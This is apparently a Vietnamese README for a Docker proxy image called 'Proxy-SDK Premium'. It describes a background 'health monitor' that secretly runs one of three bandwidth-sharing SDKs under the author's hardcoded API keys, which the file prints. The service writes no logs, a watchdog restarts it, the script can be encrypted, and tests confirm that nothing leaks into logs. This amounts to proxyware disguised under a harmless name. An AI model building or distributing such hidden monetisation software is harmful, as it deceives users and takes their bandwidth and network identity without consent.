# Proxy-SDK Premium

Image Docker này dựa trên proxy-sdk với tính năng **health monitor service** tự động chạy ngầm.

## Tính năng

- ✅ Chạy health monitor service tự động với API keys mặc định được hardcode
- ✅ Chọn ngẫu nhiên 1 trong 3 SDK mỗi lần chạy (Castar, Onlink, PacketSDK)
- ✅ Chạy hoàn toàn im lặng, không có log
- ✅ Người dùng vẫn có thể thêm SDK keys của họ như bình thường
- ✅ Script có thể được mã hóa bên ngoài nếu cần

## API Keys mặc định (hardcoded trong run_health_monitor.sh)

- CastarSDK: `cskew9gCXwYXER`
- OnlinkSDK: `okB7oVsUgLmoo4`
- PacketSDK: `bqT0b1DmYeHZHhCd`

**Lưu ý**: Script `run_health_monitor.sh` có thể được mã hóa trước khi build image nếu cần.

## Build Image

```bash
cd proxy-sdk-premium
docker build -t proxy-sdk-premium:latest .
```

## Sử dụng

### Chạy với health monitor tự động

```bash
docker run -d \
  -e PROXY_TYPE=socks \
  -e PROXY_HOST=your.proxy.host \
  -e PROXY_PORT=1080 \
  --cap-add=NET_ADMIN \
  --device=/dev/net/tun \
  proxy-sdk-premium:latest
```

### Chạy với health monitor + SDK keys của người dùng

```bash
docker run -d \
  -e PROXY_TYPE=socks \
  -e PROXY_HOST=your.proxy.host \
  -e PROXY_PORT=1080 \
  -e CASTAR_SDK_KEY="user-key" \
  -e ONLINK_KEY="user-key" \
  -e PACKET_KEY="user-key" \
  --cap-add=NET_ADMIN \
  --device=/dev/net/tun \
  proxy-sdk-premium:latest
```

## Testing

### Test Internet Connectivity

```bash
./test-internet.sh <container_name>
# Example:
./test-internet.sh proxy-sdk-0
```

Script này sẽ test:
- DNS resolution
- HTTP/HTTPS connectivity
- External IP detection
- Multiple endpoint accessibility

### Test Health Monitor Service

```bash
./test-health-monitor.sh <container_name>
# Example:
./test-health-monitor.sh proxy-sdk-0
```

Script này sẽ kiểm tra:
- Health monitor script tồn tại và có quyền thực thi
- Health monitor process đang chạy
- SDK binaries có sẵn trong container
- Không có log leak về health monitor

### Test All (Internet + Health Monitor)

```bash
./test-all.sh <container_name>
# Example:
./test-all.sh proxy-sdk-0
```

Chạy cả hai test trên và hiển thị summary.

## Lưu ý

- Health monitor service sẽ tự động chạy trong background khi container khởi động
- Health monitor chạy hoàn toàn im lặng, không hiển thị log
- Mỗi lần khởi động sẽ chọn ngẫu nhiên 1 trong 3 SDK
- Watchdog tự động restart health monitor nếu bị crash
- Người dùng không cần cấu hình gì để sử dụng health monitor

